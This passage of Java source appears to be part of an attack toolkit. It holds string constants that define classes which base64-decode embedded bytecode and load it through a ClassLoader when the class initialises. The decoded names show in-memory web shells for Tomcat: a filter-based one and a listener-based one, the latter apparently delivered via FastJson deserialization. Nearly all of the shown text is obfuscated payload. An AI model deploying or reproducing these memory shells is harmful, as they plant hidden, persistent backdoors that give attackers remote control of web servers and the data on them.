0FCUUFJQUFBQlZ5b3J3QUE2dFFBTktpekFBRHUxQUE0cXRBQU5Fank1QUQwQ0FNWUE5aXEwQUEwU1BMa0FQUUlBRWo2MkFEOENud0RpS3JRQURia0FRQUVBT2dRcXRBQU5LclFBQXJrQVFRSUF1QUJDT2dVcUdRVUR0Z0JET2dVWkJCSkV1UUJGQWdESEFDSVpCQkpFdXdCR1dTcTJBQysyQUVlM0FFZ1pCYllBU2JrQVNnTUFwd0NPS3JRQURSSkxHUVc1QUV3REFMc0FUVm0zQUU0NkJoa0VFa1M1QUVVQ0FNQUFNYllBTkRvSEdRY1pCcllBVDFjWkJ4a0Z0Z0JQVnhrSEtyUUFEYllBVDFjcXRBQU91UUJRQVFBcXRBQUpBeEFRdGdCUnRnQlNHUWUyQUZOWEtyUUFEcmtBVUFFQUtoa0d0Z0JVQkxZQVE3Z0FWYllBVWlxMEFBNjVBRkFCQUNxMEFBa1FFTFlBVnJZQVVxY0FQaXEwQUEwU1BMa0FQUUlBeGdBb0tyUUFEUkk4dVFBOUFnQVNWN1lBUHdLZkFCUXF0QUFPdVFCUUFRQVNXTFlBVXFjQUN5MHJMTGtBV1FNQXB3QUtPZ1FaQkxZQVdyRUFBUUFBQVV3QlR3QWVBQU1BYWdBQUFHb0FHZ0FBQUhzQUNBQjhBQkFBZlFBeUFINEFQUUNBQUU4QWdRQllBSUlBWkFDREFJTUFoUUNRQUlZQW1RQ0hBS29BaUFDeUFJa0F1Z0NLQU1RQWl3RGFBSXdBNEFDTkFQa0FqZ0VPQUpBQkVRQ1JBVE1Ba2dGRUFKVUJUQUNaQVU4QWx3RlJBSmdCVmdDYkFHc0FBQUJjQUFrQW1RQjFBSjhBb0FBR0FLb0FaQUNoQUc4QUJ3QTlBTkVBb2dDakFBUUFUd0MvQUtRQWVnQUZBVkVBQlFDbEFJQUFCQUFBQVZjQWJBQnRBQUFBQUFGWEFLWUFwd0FCQUFBQlZ3Q29BS2tBQWdBQUFWY0FxZ0NyQUFNQWhBQUFBQllBQi8wQWd3Y0FyQWNBTXZrQWlnSXlCMElIQUljR0FKUUFBQUFHQUFJQXJRQ2NBQUVBcmdCekFBRUFhUUFBQUNzQUFBQUJBQUFBQWJFQUFBQUNBR29BQUFBR0FBRUFBQUNmQUdzQUFBQU1BQUVBQUFBQkFHd0FiUUFBQUFFQXJ3QUFBQUlBc0E9PQwAyQDKAQAQamF2YS51dGlsLkJhc2U2NAEACmdldERlY29kZXIBAAZkZWNvZGUBABBqYXZhL2xhbmcvU3RyaW5nAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgEAHW1lbXNoZWxsL1RvbWNhdEZpbHRlck1lbVNoZWxsAQAdamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3IBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBABZnZXREZWNsYXJlZENvbnN0cnVjdG9yAQAzKFtMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAdnZXROYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAA1nZXRTdXBlcmNsYXNzAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZ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\";\n" +
            "        byte[] bytes = base64Decode(byteString);\n" +
            "        Class clazz = (Class) super.defineClass(bytes, 0, bytes.length).newInstance();\n" +
            "    }\n" +
            "}\n";

    public static final String FastJsonListenerMemShell =
            "public class FastJsonListenerMemShell extends ClassLoader{\n" +
            "    static {\n" +
            "        try {\n" +
            "            new FastJsonListenerMemShell();\n" +
            "        } catch (Exception e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "    }\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[])null).invoke(base64, (Object[])null);\n" +
            "            value = (byte[])((byte[])decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[])((byte[])decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    public FastJsonListenerMemShell() throws Exception {\n" +
            "        super(Thread.currentThread().getContextClassLoader());\n" +
            "        String byteString = \"yv66vgAAADMBUgoADgC/CQBaAMAKAFoAwQoAWgDCCgBaAMMKAFoAxAoAWgDFBwDGCgAOAMcIAMgHAMkKAAsAygoAywDMBwDNCgDLAM4HAHIKAAsAzwkAWgDQCgAlANEIANIKAAsA0woA1ADMCgDUANUKANYA1wcA2AoAGQC/CgDZANoLAEMA2wsA3ADdCwDcAN4KABkA3woA2QDgCQBaAOEIAOIKABkA4wgA5AcA5QgA5gcA5wcA6AoACwDpCgAoAOoIAOsKAAsA7AgA7QoACwDuCADvCgBaAPAIAPEKAFoA8goAGQDzBwCrCgBaAPQKAPUA9goA9QD3CAD4BwCyCgD1AM8IAPkKACUA+ggA+wcA/AgA/QgA/ggA/wgBAAcBAQsAQwECCwBDAQMIAQQIAQUJAFoBBggBBwkBCAEJCgEIAQoKAPUBCwoATwEMCgALAQ0HAQ4IAQ8HALUIARAKAFoBEQgBEggBEwgBFAgBFQgBFggBFwcBGAoAWgC/AQAQU1RBTkRBUkRfQ09OVEVYVAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEACFJFU1BPTlNFAQAPTUVNU0hFTExfT0JKRUNUAQAMTGlzdGVuZXJOYW1lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACFMbWVtc2hlbGwvVG9tY2F0TGlzdGVuZXJNZW1TaGVsbDsBAA1TdGFja01hcFRhYmxlBwEYBwDGAQAIaXNJbmplY3QBAAMoKVoBAAZvYmplY3QBAAV2YXIxNAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAHb2JqZWN0cwEAE1tMamF2YS9sYW5nL09iamVjdDsBAARmbGFnAQABWgcBGQEADmluamVjdE1lbVNoZWxsAQAEdmFyNgEABXZhcjEwAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABXZhcjEyAQAFdmFyMTMBABBMamF2YS91dGlsL0xpc3Q7AQAEdmFyMwEAFUxqYXZhL3V0aWwvQXJyYXlMaXN0OwEABHZhcjQBABNMamF2YS9sYW5nL0Jvb2xlYW47AQAEdmFyNQEAFExqYXZhL3V0aWwvSXRlcmF0b3I7AQAFdmFyMTEBAAR2YXIyAQAEdmFyOAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEABHZhcjkBABVMamF2YS9sYW5nL1Rocm93YWJsZTsHARoHAQEHANgHARsHARwHAOcBAAVnZXRGVgEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBAAR2YXIwAQAEdmFyMQEAEUxqYXZhL2xhbmcvQ2xhc3M7BwDJBwDoAQAKRXhjZXB0aW9ucwEAE2dldFN0YW5kYXJkQ29udGV4dDEBAAdyZXF1ZXN0AQAOc2VydmxldENvbnRleHQBAAxpbnZva2VNZXRob2QBAEsoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAJvMQEAAWkBAAFJAQAHY2xhc3NlcwEABm1ldGhvZAEAA29iagEACm1ldGhvZE5hbWUBAApwYXJhbWV0ZXJzBwDNBwDlAQAQZ2V0TWV0aG9kQnlDbGFzcwEAUShMamF2YS9sYW5nL0NsYXNzO0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAAWUBAAJjcwEAEltMamF2YS9sYW5nL0NsYXNzOwEAEmdldFN0YW5kYXJkQ29udGV4dAEABXZhcjE3AQAFdmFyMTUBAAV2YXIxNgEABHZhcjcBABJMamF2YS9sYW5nL1RocmVhZDsBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwEdAQATaW5qZWN0TWVtU2hlbGxDbGFzcwEAAltCAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBAAZiYXNlNjQBAAJicwEABXZhbHVlAQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQAbVG9tY2F0TGlzdGVuZXJNZW1TaGVsbC5qYXZhDABiAGMMAFwAXQwArABjDACYAGMMAGwAbQwAtABjDAB2AGMBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAEeAR8BABxnZXRBcHBsaWNhdGlvbkV2ZW50TGlzdGVuZXJzAQAPamF2YS9sYW5nL0NsYXNzDAEgASEHARkMASIBIwEAEGphdmEvbGFuZy9PYmplY3QMASQBJQwBJgEnDABgAGEMASgBKQEAIGFwcGxpY2F0aW9uRXZlbnRMaXN0ZW5lcnNPYmplY3RzDAEqASsHARoMASwBLQcBLgwBLwEwAQATamF2YS91dGlsL0FycmF5TGlzdAcBGwwBMQEyDAEzATQHARwMATUAbQwBNgE3DAE4ASkMATkAbQwAXwBdAQAcc2V0QXBwbGljYXRpb25FdmVudExpc3RlbmVycwwBOgE7AQAWYWRkQXBwbGljYXRpb25MaXN0ZW5lcgEAEGphdmEvbGFuZy9TdHJpbmcBABthZGRBcHBsaWNhdGlvbkV2ZW50TGlzdGVuZXIBABNqYXZhL2xhbmcvVGhyb3dhYmxlAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDAE8AR8MAGIBPQEALWNvbS5vcGVuc3ltcGhvbnkud2Vid29yay5TZXJ2bGV0QWN0aW9uQ29udGV4dAwBPgE/AQAKZ2V0UmVxdWVzdAwBQAEhAQARZ2V0U2VydmxldENvbnRleHQMAJsAnAEAB2NvbnRleHQMAI8AkAwBOgFBDACnAKgHAR0MAUIBQwwBRAFFAQAHdGhyZWFkcwEABGh0dHAMAUYBRwEABnRhcmdldAEAEmphdmEvbGFuZy9SdW5uYWJsZQEABnRoaXMkMAEAB2hhbmRsZXIBAAZnbG9iYWwBAApwcm9jZXNzb3JzAQAOamF2YS91dGlsL0xpc3QMAUgBSQwBLAFKAQADcmVxAQALZ2V0UmVzcG9uc2UMAF4AXQEAB2dldE5vdGUHAUsMAUwAlAwBMQFNDAFOAU8MAVABPwwBUQE3AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQALZGVmaW5lQ2xhc3MBJJB5djY2dmdBQUFETUJZZ29BWWdDNUNRQkpBTG9KQUVrQXV3Z0F2QWtBU1FDOUNBQytDUUJKQUw4SUFNQUpBRWtBd1FjQXdnb0FDZ0M1Q2dBS0FNTUtBQW9BeEFvQVNRREZDUUJKQU1ZSUFNY0pBRWtBeUFvQVlnREpDZ0JpQU1vSUFNc0tBTXdBelFjQXpnb0FNUURQQ2dBV0FOQUtBTXdBMFFvQXpBRFNCd0RUQ0FEVUNnRFZBTllLQURFQTF3b0ExUURZQndEWkNnRFZBTm9LQUNBQTJ3b0FJQURjQ2dBeEFOMElBTjRLQUM0QTN3Z0E0QWNBNFFvQUxnRGlCd0RqQ2dEa0FPVUtBREFBNWdnQTV3Y0E2QWNBZXdjQTZRY0E2Z2dBNndvQUxnRHNDQUR0Q0FEdUNBRHZDQUR3Q0FEeEN3QmdBUElMQUdBQTh3b0E5QUQxQndEMkNnQkpBUGNJQVBnTEFEd0ErUWdBK2dvQU1RRDdDZ0JKQVB3TEFEd0EvUXNBUEFEK0NnQkpBUDhLQUVrQkFBZ0JBUXNCQWdFREJ3RUVDZ0F1QVFVS0FFa0F5UW9BU1FFR0N3RUNBUWNJQVFnTEFEd0JCd2NCQ1FvQVVBQzVDZ0F3QVFvS0FERUJDd29CREFFTkNnQXdBTVFLQUZBQkRnb0FTUUVQQ2dBeEFSQUlBUkVJQVJJS0FCc0JFd2dBWmdvQUxnRVVDZ0VWQVJZS0FSVUJGd2NCR0FnQVpBY0JHUWNCR2dFQUIzSmxjWFZsYzNRQkFDZE1hbUYyWVhndmMyVnlkbXhsZEM5b2RIUndMMGgwZEhCVFpYSjJiR1YwVW1WeGRXVnpkRHNCQUFoeVpYTndiMjV6WlFFQUtFeHFZWFpoZUM5elpYSjJiR1YwTDJoMGRIQXZTSFIwY0ZObGNuWnNaWFJTWlhOd2IyNXpaVHNCQUFKNFl3RUFFa3hxWVhaaEwyeGhibWN2VTNSeWFXNW5Pd0VBQTFCM1pBRUFCSEJoZEdnQkFBTnRaRFVCQUFKamN3RUFCanhwYm1sMFBnRUFBeWdwVmdFQUJFTnZaR1VCQUE5TWFXNWxUblZ0WW1WeVZHRmliR1VCQUJKTWIyTmhiRlpoY21saFlteGxWR0ZpYkdVQkFBUjBhR2x6QVFBZVRHMWxiWE5vWld4c0wxUnZiV05oZEV4cGMzUmxibVZ5VTJobGJHdzdBUUFhS0V4cVlYWmhMMnhoYm1jdlEyeGhjM05NYjJGa1pYSTdLVllCQUFGNkFRQVhUR3BoZG1FdmJHRnVaeTlEYkdGemMweHZZV1JsY2pzQkFBRlJBUUFWS0Z0Q0tVeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0FRQUNZMklCQUFKYlFnRUFBWGdCQUFjb1cwSmFLVnRDQVFBQll3RUFGVXhxWVhaaGVDOWpjbmx3ZEc4dlEybHdhR1Z5T3dFQUJIWmhjalFCQUJWTWFtRjJZUzlzWVc1bkwwVjRZMlZ3ZEdsdmJqc0JBQUZ6QVFBQmJRRUFBVm9CQUExVGRHRmphMDFoY0ZSaFlteGxCd0VFQndFYkJ3RFRBUUFtS0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzQkFCMU1hbUYyWVM5elpXTjFjbWwwZVM5TlpYTnpZV2RsUkdsblpYTjBPd0VBQTNKbGRBY0E2Z0VBREdKaGMyVTJORVZ1WTI5a1pRRUFGaWhiUWlsTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzQkFBZEZibU52WkdWeUFRQVNUR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdBUUFHWW1GelpUWTBBUUFSVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjenNCQUFSMllYSTJBUUFDWW5NQkFBVjJZV3gxWlFFQUNrVjRZMlZ3ZEdsdmJuTUJBQXhpWVhObE5qUkVaV052WkdVQkFCWW9UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVnRDQVFBSFpHVmpiMlJsY2dFQUNXZGxkRmR5YVhSbGNnRUFPaWhNYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWEoyYkdWMFVtVnpjRzl1YzJVN0tVeHFZWFpoTDJsdkwxZHlhWFJsY2pzQkFBTnZkWFFCQUJCTWFtRjJZUzlwYnk5WGNtbDBaWEk3QndFWUJ3RWNBUUFRY21WeGRXVnpkRVJsYzNSeWIzbGxaQUVBSmloTWFtRjJZWGd2YzJWeWRteGxkQzlUWlhKMmJHVjBVbVZ4ZFdWemRFVjJaVzUwT3lsV0FRQURjbVZ4QVFBalRHcGhkbUY0TDNObGNuWnNaWFF2VTJWeWRteGxkRkpsY1hWbGMzUkZkbVZ1ZERzQkFCSnlaWEYxWlhOMFNXNXBkR2xoYkdsNlpXUUJBQVpoY25KUGRYUUJBQjlNYW1GMllTOXBieTlDZVhSbFFYSnlZWGxQZFhSd2RYUlRkSEpsWVcwN0FRQUJaZ0VBQjNObGMzTnBiMjRCQUNCTWFtRjJZWGd2YzJWeWRteGxkQzlvZEhSd0wwaDBkSEJUWlhOemFXOXVPd0VBQkdSaGRHRUJBQVIyWVhJNUJ3RWRCd0QyQndFZUFRQVdaMlYwVW1WemNHOXVjMlZHY205dFVtVnhkV1Z6ZEFFQVVTaE1hbUYyWVhndmMyVnlkbXhsZEM5b2RIUndMMGgwZEhCVFpYSjJiR1YwVW1WeGRXVnpkRHNwVEdwaGRtRjRMM05sY25ac1pYUXZhSFIwY0M5SWRIUndVMlZ5ZG14bGRGSmxjM0J2Ym5ObE93RUFCSFpoY2pNQkFCbE1hbUYyWVM5c1lXNW5MM0psWm14bFkzUXZSbWxsYkdRN0FRQUVkbUZ5TlFFQUJIWmhjamdCQUFSMllYSXhBUUFFZG1GeU1nRUFDbE52ZFhKalpVWnBiR1VCQUJoVWIyMWpZWFJNYVhOMFpXNWxjbE5vWld4c0xtcGhkbUVNQUc0QWJ3d0FaQUJsREFCbUFHY0JBQkF